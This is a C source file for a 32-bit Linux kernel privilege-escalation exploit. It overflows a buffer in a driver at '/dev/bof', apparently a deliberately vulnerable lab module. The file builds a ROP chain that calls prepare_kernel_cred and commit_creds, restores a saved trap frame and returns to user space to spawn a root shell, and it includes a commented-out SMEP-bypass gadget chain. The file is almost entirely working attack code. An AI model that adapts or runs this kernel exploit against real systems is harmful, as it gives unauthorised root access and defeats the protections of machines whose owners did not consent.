// gcc -std=c99 -m32 -static rop.c -o rop && chmod 755 rop
     
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
     
struct trap_frame tf;
     
struct trap_frame {
      void*     eip;      /* instruction pointer */
      uint32_t  cs;       /* code segment */
      uint32_t  eflags;   /* CPU flags */
      void*     esp;      /* stack pointer */
      uint32_t  ss;       /* stack segment */
    } __attribute__((packed));
     
void launch_shell(void) {
      execl("/bin/sh", "sh", NULL);
    }
     
uintptr_t ropchain[] = {
    /*
        // disable smep
        0xc12b4a73,     // pop edx ; pop eax ; pop ebx ; ret
        0xffe006d0,     // and mask to disable smep
        0x41414141,     // padding
        0x41414141,     // padding
        0xc101d6c3,     // mov eax, cr4 ; ret
        0xc101d7b5,     // and eax, edx ; ret
        0xc101d6cd,     // mov cr4, eax ; ret
    */
     
        // priv esc
        0xc103a33f,     /* xor edx, edx ; mov eax, edx ; ret */
        0xc1040aa4,     /* prepare_kernel_cred */
        0xc1040bc7,     /* commit_creds */
     
        // restore stack
        0xc116ba08,     /* pop edi ; pop ecx ; ret */
        (uintptr_t)&tf, /* tf struct addr */
        0x41414141,     /* padding */
        0xc1342372,     /* mov esp, edi ; ret */
     
        (uintptr_t)&launch_shell /* ret2user */
      };
     
void build_rop(uint16_t base) {
        uint8_t buf[1024];
        uint8_t *ptr = buf;
        char *rp = (char*)ropchain;
     
        for(size_t i=0; i < base; ++i) {
            *(ptr++) = 'A';
        }
     
        for(size_t i=0; i <= strlen((char*)ropchain); ++i) {
            *(ptr++) = *(rp+i);
        }
     
        FILE *fd = fopen("/dev/bof", "a");
        fwrite(buf, strlen((char*)buf), 4, fd);
        fclose(fd);
    }
     
void prepare_tf(void) {
      __asm(
          "pushl %cs;   popl tf+4;"
          "pushfl;      popl tf+8;"
          "pushl %esp;  popl tf+12;"
          "pushl %ss;   popl tf+16;");
      tf.eip = (void*)&launch_shell;
      tf.esp -= 1024; // unused part of stack
    }
     
     
int main() {
      fprintf(stdout, "\n[*] Backing up stack state...\n");
      prepare_tf();
     
      fprintf(stdout, "[*] Mapping ropchain...\n");
      fprintf(stdout, "[*] Trigger kernel...\n\n");
     
      build_rop(40);
      return EXIT_SUCCESS;
    }
